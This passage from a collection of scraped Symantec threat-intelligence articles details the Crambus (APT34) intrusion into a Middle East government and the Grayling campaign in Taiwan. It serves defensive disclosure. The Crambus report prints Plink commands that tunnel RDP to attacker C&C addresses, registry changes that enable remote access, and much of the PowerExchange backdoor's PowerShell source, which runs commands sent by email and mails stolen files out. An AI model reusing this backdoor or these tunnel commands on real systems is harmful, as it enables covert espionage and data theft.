automation technologies in mobile security. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/spyware-obfuscation-static-analysis"
  },
  {
    "title": "crambus middle east government",
    "content": "The Iranian Crambus espionage group (aka OilRig, APT34) staged an eight-month-long intrusion against a government in the Middle East between February and September 2023. During the compromise, the attackers stole files and passwords and, in one case, installed a PowerShell backdoor (dubbed PowerExchange) that was used to monitor incoming mails sent from an Exchange Server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results  to the attackers. Malicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more. In addition to deploying malware, the attackers made frequent use of the publicly available network administration tool Plink to configure port-forwarding rules on compromised machines, enabling remote access via the Remote Desktop Protocol (RDP). There is also evidence the attackers modified Windows firewall rules in order to enable remote access. Crambus is a long-running Iranian espionage group that has mounted operations against targets in multiple countries, including Saudi Arabia, Israel, the United Arab Emirates, Iraq, Jordan, Lebanon, Kuwait, Qatar, Albania, the U.S., and Turkey. The group is known to stage long-running intrusions for intelligence gathering and spying purposes. In recent years it has added a heavy social engineering component to the early stages of its attacks. It most recently came to attention last year, whenMicrosoft linked the groupto a destructive attack against the Albanian government. It assessed that Crambus was involved in gaining initial access and exfiltrating data from impacted networks. Wipers were likely then deployed by other Iran-linked actors. During this latest attack, Crambus deployed three previously undiscovered pieces of malware, along with the PowerExchange backdoor, a known backdoor that hadn’t yet been attributed to Crambus. In addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools. The first evidence of malicious activity on the target’s network occurred on February 1, 2023, when an unknown PowerShell script (file name: joper.ps1) was executed from a suspicious directory: CSIDL_PROFILE\\public\\sat. The same script was executed multiple times on the same computer (Computer 1) over the next seven days. Four days later, on February 5, the attackers accessed a second computer (Computer 2) and a renamed version of Plink (msssh.exe), a command-line connection tool for the PuTTY SSH client, was used to configure port-forwarding rules allowing for RDP access from a remote host: CSIDL_PROFILE\\public\\sat\\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED] This masqueraded Plink (mssh.exe) was executed repeatedly on this computer up until February 12. On February 21, malicious activity commenced on a web server (Web Server 1) when a netstat command was executed to retrieve a full list of all TCP and UDP connections. The netstat command line switches perform the following actions: Next, Plink (mssh.exe) was launched again to enable remote RDP access. After this occurred, there was evidence that a PowerShell script was used to mount the C: drive of another computer on the network. On April 8, the attackers gained access to a third computer (Computer 3), where another variant of Plink was executed from the %USERPROFILE%\\public directory and was used to forward port 3389 to port 999 on all available interfaces: CSIDL_PROFILE\\public\\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389 The options supplied in the command perform the following actions: At the same time, an unknown batch file was executed, which redirected output to a text file in the %USERPROFILE%\\public directory. cmd /c CSIDL_PROFILE\\public\\p2.bat > CSIDL_PROFILE\\public\\001.txt 2>&1 Immediately afterwards, the same Plink command was run a second time. This is followed by the same unknown batch script being executed several more times. Later that day, Mimikatz was executed from the %TEMP% directory to dump credentials. On April 9, another netstat command was run on a new compromised computer, the Domain Controller (Computer 4): The “o” option adds the process ID (PID) of the associated process that's using each network connection or listening port. The command will provide a list of all active network connections, both incoming and outgoing, along with the associated PID of the processes using those connections. Three hours later, Mimikatz was run again to dump credentials. The next day, April 10, an unknown windows batch file (file name: p.bat) was executed on Computer 3. This was followed by a Plink command: plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389 The options perform the following actions: The command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s RDP service as if it was running locally. On April 23, activity resumed on Computer 3, when previously unseen malware named Backdoor.Tokel (file name: telecomm.exe) was executed. On May 7, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) to run an unknown script (file name: hwf.ps1). Malicious activity appeared to cease for nearly a month until June 4, when Backdoor.Tokel was executed again on Computer 3. On June 17, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) in order to run another unknown script (file name: zone.ps1). On June 20, Backdoor.PowerExchange (file name: setapp.ps1) was run on Computer 3. The PowerShell-based backdoor is designed to execute commands received from the attackers. This is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers. Email’s that contain “@@” in the subject line are read by Backdoor.PowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C. The script allows four commands to execute: The attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior. On July 1, the attackers once again utilized the masqueraded version of Plink to open a tunnel on Computer 3 by redirecting RDP to Port 12345 on any listening interface, effectively allowing external connections over RDP to the compromised machine. The next day, July 2, the attackers used netstat to list all open and listening TCP and UDP ports. It's possible the attackers were checking that the SSH tunnel was still active. On July 8, the attackers used the Domain Controller (Computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat). The service was configured to auto-start during the boot up process. Over the next two days, July 9 and 10, another new piece of malware named Trojan.Dirps (file name: virtpackage.exe) was repeatedly executed on Computer 3. On July 11, the attackers introduced more malicious tools to Computer 3, installing a third new piece of malware named Infostealer.Clipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents. The next day (July 12) the attackers ran Mimikatz on the Domain Controller (Computer 4) to dump credentials. On July 15, the attackers again ran the unknown PowerShell script (zone.ps1) on the Domain Controller (Computer 4), followed by a second unknown script (copy.ps1). On July 18, the attackers again executed Infostealer.Clipog on Computer 3 before creating an SSH tunnel using Plink to access RDP services. This SSH tunnel was created again on August 3. On August 6, yet another unknown PowerShell script (file name: tnc.ps1) was executed on the Domain Controller (Computer 4). Immediately afterwards, Nessus vulnerability scans were observed, specially hunting for Log4j vulnerabilities on other machines on the network. While this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules. CSIDL_SYSTEM\\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose Following this, another PowerShell script was executed. The script appeared to be designed to query and collect information about local user groups and their members on a Windows system. Its output was information about SIDs, names, object classes, and principal sources of local user groups and their members in a structured format. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g.SID,'|',$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' ',$m.SID,'|',$m.Name,'|',$m.ObjectClass,'|',$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;}; After this, net.exe was used to list all mapped drives, before WMI (Windows Management Instrumentation) was used to execute Plink in order to open port-forwarding on the compromised host, allowing for remote RDP access. On August 7 and again on August 12, Plink was downloaded from the internet on to the Domain Controller (Computer 4) and saved as \\ProgramData\\Adobe.exe. On August 30, the attackers obtained access to a second web server (Web Server 2). They first used Plink to enable access to RDP on Port 12345 from their C&C server (91.132.92[.]90). They then installed Infostealer.Clipog using a different file name (fs-tool.exe). The next day, August 31, the attackers established a tunnel once again to open RDP access on Port 4455 from their C&C. Output was redirected to a text file (file name: 001.txt). There may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using Port 12345. On September 1, the attackers shifted their attention to three more computers (Computer 5, Computer 6 and Computer 7), using Certutil to download Plink to each machine. They then executed an unknown PowerShell script (file name: joper.ps1) on Web Server 2. On September 2, the attackers ran the following netstat command on Web Server 2: This command is used to list all active connections. The unknown PowerShell script (file name: joper.ps1) was then run again. On September 3, the attackers once again ran joper.ps1 before two suspicious Wireshark commands were executed: ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\extcap\\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0 ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\dumpcap.exe; -D -Z none Wireshark’s usbcapcmd utility was used to capture USB traffic on specified USB devices and save the captured data to a file. Similarly, dumpcap was used to capture network packets. It appears the attackers were interested in identifying any available network or USB interfaces from which they could capture packets on the machine. Immediately afterwards, a suspicious netstat command ran: This will list all active connections and print them to standard output in numerical form. After joper.ps1 was once again executed, the attackers turned their attention back to Computer 3, where they ran a number of reg.exe commands: reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f These commands were used to modify system configuration to enable Terminal Services (i.e. remote access) to the computer via RDP. A few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials. ;CSIDL_SYSTEM\\net.exe; use \\\\[REMOVED]\\c$ /user:[REMOVED] [REMOVED] On September 4, the attackers executed three different variants of the joper.ps1 script on Web Server 2. They then turned their attention back to Computer 1, where a new variant of the Backdoor.Tokel malware was installed on the computer. The next day, September 5 the attackers once again ran the joper.ps1 script on Web Server 2, while using net.exe to mount and unmount various network shares. They then executed Backdoor.Tokel on Computer 3 again before installing it on two more computers (Computer 9 and Computer 10). Malicious activity continued until September 9, with the attackers largely focusing their attention on Web Server 2, running the joper.ps1 script and mounting/unmounting network shares. Crambus is a long-running and experienced espionage group that has extensive expertise in carrying out long campaigns aimed at targets of interest to Iran.After a 2019 leak of its toolset, there was some speculation that Crambus may disappear. However, its activities over the past two years demonstrate that it represents a continuing threat for organizations in the Middle East and further afield. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 4d04ad9d3c3abeb61668e52a52a37a46c1a60bc8f29f12b76ff9f580caeefba8 – Backdoor.Tokel 41672b08e6e49231aedf58123a46ed7334cafaad054f2fd5b1e0c1d5519fd532 – Backdoor.Tokel 497e1c76ed43bcf334557c64e1a9213976cd7df159d695dcc19c1ca3d421b9bc – Trojan.Dirps 75878356f2e131cefb8aeb07e777fcc110475f8c92417fcade97e207a94ac372 – Infostealer.Clipog d884b3178fc97d1077a13d47aadf63081559817f499163c2dc29f6828ee08cae – Backdoor.PowerExchange a1a633c752be619d5984d02d4724d9984463aa1de0ea1375efda29cadb73355a – PowerShell script 22df38f5441dec57e7d7c2e1a38901514d3f55203b2890dc38d2942f1e4bc100 – PowerShell script 159b07668073e6cd656ad7e3822db997d5a8389a28c439757eb60ba68eaff70f – PowerShell script 6964f4c6fbfb77d50356c2ee944f7ec6848d93f05a35da6c1acb714468a30147 – PowerShell script 661c9535d9e08a3f5e8ade7c31d5017519af2101786de046a4686bf8a5a911ff – PowerShell script db1cbe1d85a112caf035fd5d4babfb59b2ca93411e864066e60a61ec8fe27368 – PowerShell script 497978a120f1118d293906524262da64b15545ee38dc0f6c10dbff3bd9c0bac2 – PowerShell script db1cbe1d85a112caf035fd5d4babfb59b2ca93411e864066e60a61ec8fe27368 – PowerShell script 6b9f60dc91fbee3aecb4a875e24af38c97d3011fb23ace6f34283a73349c4681 – PowerShell script 497978a120f1118d293906524262da64b15545ee38dc0f6c10dbff3bd9c0bac2 – PowerShell script be6d631fb2ff8abe22c5d48035534d0dede4abfd8c37b1d6cbf61b005d1959c1 – PowerShell script 22df38f5441dec57e7d7c2e1a38901514d3f55203b2890dc38d2942f1e4bc100 – PowerShell script 661c9535d9e08a3f5e8ade7c31d5017519af2101786de046a4686bf8a5a911ff – PowerShell script 159b07668073e6cd656ad7e3822db997d5a8389a28c439757eb60ba68eaff70f – PowerShell script 6bad09944b3340947d2b39640b0e04c7b697a9ce70c7e47bc2276ed825e74a2a – PowerShell script ba620b91bef388239f3078ecdcc9398318fd8465288f74b4110b2a463499ba08 – PowerShell script d0bfdb5f0de097e4460c13bc333755958fb30d4cb22e5f4475731ad1bdd579ec – PowerShell script 5a803bfe951fbde6d6b23401c4fd1267b03f09d3907ef83df6cc25373c11a11a – PowerShell script 1698f9797f059c4b30f636d16528ed3dd2b4f8290e67eb03e26181e91a3d7c3b – PowerShell script 23db83aa81de19443cafe14c9c0982c511a635a731d6df56a290701c83dae9c7 – PowerShell script 41ff7571d291c421049bfbd8d6d3c51b0a380db3b604cef294c1edfd465978d9 – PowerShell script c488127b3384322f636b2a213f6f7b5fdaa6545a27d550995dbf3f32e22424bf – PowerShell script 6964f4c6fbfb77d50356c2ee944f7ec6848d93f05a35da6c1acb714468a30147 – PowerShell script 927327bdce2f577b1ee19aa3ef72c06f7d6c2ecd5f08acc986052452a807caf2 – PowerShell script a6365e7a733cfe3fa5315d5f9624f56707525bbf559d97c66dbe821fae83c9e9 – PowerShell script c3ac52c9572f028d084f68f6877bf789204a6a0495962a12ee2402f66394a918 – PowerShell script 7e107fdd6ea33ddc75c1b75fdf7a99d66e4739b4be232ff5574bf0e116bc6c05 – PowerShell script 78.47.218[.]106 – Plink C&C 192.121.22[.].46 – Plink C&C 151.236.19[.]91 – Plink C&C 91.132.92[.]90 – Plink C&C $OutputEncoding = [console]::InputEncoding = [console]::OutputEncoding = New-Object System.Text.UTF8Encoding $dir=\"$env:PUBLIC\\MicrosoftEdge\" $directory = get-childitem -Path \"$($dir)\\*\"-Include 'config.conf' $userid = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)) $mailList = New-Object Collections.Generic.List[String] $mailList.Add('Ahmed_Alrashed20@outlook.com') $subject = \"Update Microsoft Edge\" $body = \"Microsoft Edge Update\" $rule = \"defaultexchangerules\" $NewRule = [Microsoft.Exchange.WebServices.Data.Rule]::new() $NewRule.DisplayName = $rule $NewRule.Priority = 1 $newRule.IsEnabled = $true; $NewRule.Conditions.ContainsSubjectStrings.Add(\"@@\") $NewRule.Actions.MoveToFolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::DeletedItems $CreateRuleOperation = [Microsoft.Exchange.WebServices.Data.CreateRuleOperation]::new($NewRule) $ExchangeService.UpdateInboxRules([Microsoft.Exchange.WebServices.Data.RuleOperation[]]@($CreateRuleOperation),$true) using System.Security.Cryptography.X509Certificates; publicclassTrustAllCertsPolicy : ICertificatePolicy { publicbool CheckValidationResult( ServicePoint srvPoint, X509Certificate certificate, WebRequest request, intcertificateProblem) { [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy $dllpath = get-childitem -Path \"$($dir)\\*\"-Include 'Microsoft.Exchange.WebServices.dll' try{[void][Reflection.Assembly]::LoadFile($dllpath.FullName)}catch{$_.Exception | Out-File -FilePath \"$($dir)\\EWSERROR.txt\"-Append;exit} $global:ExchangeService = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService $ExchangeService.UserAgent = \"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\"; $urllist = @([System.Uri][REMOVED],[System.Uri][REMOVED],[System.Uri] [REMOVED]) $userlist = @([REMOVED],[REMOVED]) foreach($item in $userlist ) $username=$item.split('||')[0] $password=$item.split('||')[2] if(-not [string]::IsNullOrEmpty($username)) $ExchangeService.Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials($username,$password) foreach($url in $urllist) $ExchangeService.Url=$url $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} catch{\"URL: \"+$url.Host+[Environment]::NewLine+\"User: \"+$username+[Environment]::NewLine+$_.Exception.Message | Out-File -FilePath \"$($dir)\\EWSERROR.txt\"-Append} $exchangeservice.UseDefaultCredentials=$true foreach($url in $urllist) $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} if(-not [string]::IsNullOrEmpty($username)) $ExchangeService.Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials($username,$password) $ExchangeService.AutodiscoverUrl($username) $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} $exchangeservice.UseDefaultCredentials = $true $ExchangeService.AutodiscoverUrl($username) $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} $folder = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) try{$inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($exchangeservice,$folder)}catch{} $iv = New-object Microsoft.Exchange.WebServices.Data.ItemView(10) $inboxitems= $inboxfolder.FindItems($iv) $itemIds = $inboxitems.id.UniqueId foreach($itemId in $itemIds) try{$message = [Microsoft.Exchange.WebServices.Data.Item]::Bind($ExchangeService,$itemId)}catch{} if($mailList.Contains($message.ToRecipients.Name)) $message.Delete('HardDelete') {param([string]$mail,[string]$data) $message = New-Object Microsoft.Exchange.WebServices.Data.EmailMessage($ExchangeService) $Resultb64Bytes = [System.Text.Encoding]::UTF8.GetBytes($data) $message.ToRecipients.Add($mail) $message.Subject = $subject $message.Body = $body $message.Attachments.AddFileAttachment(\"New Text Document.txt\",$Resultb64Bytes) try{$message.Send()}catch{} Start-Sleep -Seconds 15 $response = New-Object Collections.Generic.List[String] $Inbox = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox $DeletedItems=[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::DeletedItems $JunkEmail=[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::JunkEmail $folders=@($DeletedItems,$Inbox,$JunkEmail) foreach($f in $folders) $folder = New-Object Microsoft.Exchange.WebServices.Data.FolderId($f) try{$inboxfolder=[Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,$folder)}catch{} $iv = New-object Microsoft.Exchange.WebServices.Data.ItemView(10) $searchFilter = New-Object Microsoft.Exchange.WebServices.Data.SearchFilter+ContainsSubstring([Microsoft.Exchange.WebServices.Data.ItemSchema]::subject,'@@') $result = $ExchangeService.FindItems($folder,$searchFilter,$iv) if(-not [string]::IsNullOrEmpty($result)) $ItemIds = $result.id.UniqueId foreach($ItemId in $ItemIds) try{$x=[Microsoft.Exchange.WebServices.Data.Item]::Bind($ExchangeService,$ItemId)}catch{} $mailSender = $x.sender.Address $xx = $x.Subject -match \"@@(.*)@@\" try{$id=$Matches[1]}catch{} if(-not [string]::IsNullOrEmpty($id)) $response.Add(\"planA\") $response.Add($ItemId) elseif($flag -eq $false) $response.Add(\"planB\") $response.Add($mailSender) try{$message=[Microsoft.Exchange.WebServices.Data.Item]::Bind($ExchangeService,$ItemId)}catch{} $mailSender = $message.Sender.Address $message.IsRead=$true $message.Update([Microsoft.Exchange.WebServices.Data.ConflictResolutionMode]::AutoResolve) foreach($attachment in $message.Attachments) $RawData = ([System.Text.Encoding]::UTF8.GetString($attachment.Content)).substring(7) if($RawData.Length%4-ne 0) $newRawData = $RawData.PadRight(($RawData.Length+$RawData.Length%4),'=') $Data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newRawData)) $Data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($RawData)) $message.Delete('HardDelete') $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7| % {[char]$_}) foreach ($h in $cmd.GetEnumerator()) if(($h.value).Length%4-ne 0) $newValue = ($h.value).PadRight((($h.value).Length+($h.value).Length%4),'=') $com = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newValue)) $com = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($h.value)) if(![string]::IsNullOrEmpty($com)) $run = iex $com | out-string $extb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.Name):$($uuid)$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"$run\"))):$($uuid)$($extb64)\"+[System.Environment]::Newline sendMessage $mailSender $Total $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7| % {[char]$_}) foreach ($h in $dl.GetEnumerator()) if(($h.value).Length%4-ne 0) $newpath = $($h.value).PadRight(($($h.value).Length+$($h.value).Length%4),'=') $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newpath)).Replace('\"',\"\") $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($h.value)).Replace('\"',\"\") $size = (Get-Item $path).Length $DataBytes= [System.IO.File]::ReadAllBytes($path) $Datab64 = [Convert]::ToBase64String($DataBytes) $ext = [System.IO.Path]::GetExtension($path) $extb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($ext)) $Datab64= [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"Size is Greater than 5 MB\")) $extb64= [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.Name):$($uuid)$($Datab64):$($uuid)$($extb64)\"+[System.Environment]::Newline sendMessage $mailSender $Total $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7| % {[char]$_}) foreach ($h in $up.GetEnumerator()) $Fileb64 = ($h.value).split(':')[0] $Pathb64 = ($h.value).split(':')[1] if($Pathb64.Length%4-ne 0) $newpathb64 = $Pathb64.PadRight(($Pathb64.Length+$Pathb64.Length%4),'=') $path_save = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newpathb64)).Replace('\"','') $path_save = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Pathb64)).Replace('\"','') if($Fileb64.Length%4-ne 0) $newFileb64 = $Fileb64.PadRight(($Fileb64.Length+$Fileb64.Length%4),'=') $Fileb64Bytes = [System.Convert]::FromBase64String($newFileb64) $Fileb64Bytes = [System.Convert]::FromBase64String($Fileb64) [System.IO.File]::WriteAllBytes($path_save,$Fileb64Bytes) $Datab64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"file upload\")) $extb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.Name):$($uuid)$($Datab64):$($uuid)$($extb64)\"+[System.Environment]::Newline sendMessage $mailSender $Total $timer = [System.Diagnostics.Stopwatch]::StartNew() while(($timer.Elapsed.TotalMinutes -lt 5) -and (([string]::IsNullOrEmpty($value)))) Start-Sleep -Seconds 10 if(-not[string]::IsNullOrEmpty($value)) if($value[0] -eq \"planA\") if($value[0] -eq \"planB\") $mailList+= $value[1] sendMessage $value[1] $userid foreach ($mail in $mailList) sendMessage $mail $userid if(-not[string]::IsNullOrEmpty($value)) if($value[0] -eq \"planA\") $connect = connection if($connect -eq $true) if($directory.Name -ne 'config.conf') try{New-Item -Path \"$($dir)\"-ItemType File -Name \"config.conf\"-ErrorAction Stop;core}catch{} The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/crambus-middle-east-government"
  },
  {
    "title": "grayling taiwan cyber attacks",
    "content": "A previously unknown advanced persistent threat (APT) group used custom malware and multiple publicly available tools to target a number of organizations in the manufacturing, IT, and biomedical sectors in Taiwan. A government agency located in the Pacific Islands, as well as organizations in Vietnam and the U.S., also appear to have been hit as part of this campaign. This activity began in February 2023 and continued until at least May 2023. The Symantec Threat Hunter Team, part ofBroadcom, has attributed this activity to a new group we are calling Grayling. This activity stood out due to the use by Grayling of a distinctive DLL sideloading technique that uses a custom decryptor to deploy payloads. The motivation driving this activity appears to be intelligence gathering. There are indications that Grayling may exploit public facing infrastructure for initial access to victim machines. Web shell deployment was observed on some victim computers prior to DLL sideloading activity taking place. DLL sideloading is used to load a variety of payloads, including Cobalt Strike, NetSpy, and the Havoc framework. The attackers take various actions once they gain initial access to victims’ computers, including escalating privileges, network scanning, and using downloaders. Tactics, techniques, and procedures (TTPs) used by the attackers included: The typical attack chain in this activity appears to be DLL sideloading through exported API SbieDll_Hook. This leads to the loading of various tools, including a Cobalt Strike Stager that leads to Cobalt Strike Beacon, the Havoc framework, and NetSpy. The attackers were also seen loading and decrypting an unknown payload from imfsb.ini. An exploit for CVE-2019-0803 was also used in the course of this activity, while shellcode was also downloaded and executed. Other post-exploitation activity performed by these attackers includes using kill processes to kill all processes listed in a file called processlist.txt, and downloading the publicly available credential-dumping tool Mimikatz. While we do not see data being exfiltrated from victim machines, the activity we do see and the tools deployed point to the motivation behind this activity being intelligence gathering. The sectors the victims operate in – manufacturing, IT, biomedical, and government – are also sectors that are most likely to be targeted for intelligence gathering rather than for financial reasons. The use of custom techniques combined with publicly available tools is typical of the activity we see from APT groups these days, with threat actors often using publicly available or living-off-the-land tools in attempts to bypass security software and help their activity stay under the radar of defenders. Tools like Havoc and Cobalt Strike are also frequently used by attackers due to their wide array of capabilities. It is often easier for even skilled attackers to use existing tools like this than to develop custom tools of their own with similar capabilities. The use of publicly available tools can also make attribution of activity more difficult for investigators. The steps taken by the attackers, such as killing processes etc., also indicate that keeping this activity hidden was a priority for them. We have not been able to definitively link Grayling to a specific geography, but the heavy targeting of Taiwanese organizations does indicate that they likely operate from a region with a strategic interest in Taiwan. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. da670d5acf3648b0deaecb64710ae2b7fc41fc6ae8ab8343a1415144490a9ae9 – Havoc framework79b0e6cd366a15848742e26c3396e0b63338ead964710b6572a8582b0530db17 – Downloaderbf1665c949935f3a741cfe44ab2509ec3751b9384b9eda7fb31c12bfbb2a12ec – Downloaderc2a714831d8a7b0223631eda655ce62ff3c262d910c0a2ed67c5ca92ef4447e3 – Cobalt Strike Beacon667624b10108137a889f0df8f408395ae332cc8d9ad550632a3501f6debc4f2c – Exploit for CVE-2019-080387a7e428d08ecc97201cc8f229877a6202545e562de231a7b4cab4d9b6bbc0f8 – Downloader90de98fa17294d5c918865dfb1a799be80c8771df1dc0ec2be9d1c1b772d9cf0 – Loader8b6c559cd145dca015f4fa06ef1c9cd2446662a1e62eb51ba2c86f4183231ed2 – Cobalt Strike Stagerd522bf1fb3b869887eaf54f6c0e52d90514d7635b3ff8a7fd2ce9f1d06449e2c – NetSpy4fbe8b69f5c001d00bd39e4fdb3058c96ed796326d6e5e582610d67252d11aba – DLL file9bad71077e322031c0cf7f541d64c3fed6b1dc7c261b0b994b63e56bc3215739 – NetSpyf2aaedb17f96958c045f2911655bfe46f3db21a2de9b0d396936ef6e362fea1b – Downloader525417bdd5cdd568605fdbd3dc153bcc20a4715635c02f4965a458c5d008eba9 – Downloader23e5dfaf60c380837beaddaaa9eb550809cd995f2cda99e3fe4ca8b281d770ae – Downloader6725e38cbb15698e957d50b8bc67bd66ece554bbf6bcb90e72eaf32b1d969e50 – Downloader5ef2e36a53c681f6c64cfea16c2ca156cf468579cc96f6c527eca8024bfdc581 – Downloader 12924d7371310c49b1a215019621597926ef3c0b4649352e032a884750fab746 – Windumpab09e8cac3f13dea5949e7a2eaf9c9f98d3e78f3db2f140c7d85118b9bc6125fc76ba3eb764706a32013007c147309f0be19efff3e6a172393d72d46631f712e245016ace30eda7650f6bb3b2405761a6a5ff1f44b94159792a6eb64ced023aa4c44efc7d9f4cd71c43c6596c62b91740eb84b7eb9b8cf22c7034b75b5f432d9e75f2cee98c4b068a2d9e7e77599998196fd718591d3fa23b8f684133d1715c3f3e8f2ef4ad949a0ada037f52f4c0e6000d111a4ac813e64138f0ded865e6e31971ab5d4f0ec58fa1db61622a735a51e14e70ee5d99ab3cd554e0070b248eb1ff1764f8c6fc428237ffafeb08eb0503558c68c6ccf6f2510a2ef8c574ba347e0c24b19e7ccd965dfeed553c94b093533e527c55d5adbc9f0e87815d477924be5af26d07754c8d4d1cb88195f7dc53e2e4ebee382c5b84fc54a81ba1cee4d08891f15c3ae1ce442a67e3d01ed291604bfc1cb196454b717e4fb5ac52daa37ecce7ea706d8da9d68e1214e30c6373713da3585df8a337bc64fcc154fc5363f5f1f30130ea1ab762c155289a32db810168f59c3d37b69bcbedfd284c4a861d749d674cbde4d4b4ac4cae943831035bff90814fa54fd21c3a6a6ec16e7e3fb235f87752018c117e07f5d58eed35622777e971a5f495184df1c25041ff525ca72acea6a8c39e4c543e94f6e4901d0facee7793f932cd2351259d8054981cf2b4da814803d0d07d64010b102413da61bbf7b4d378891e2a46848b88ef69ca9357e37217c1b20de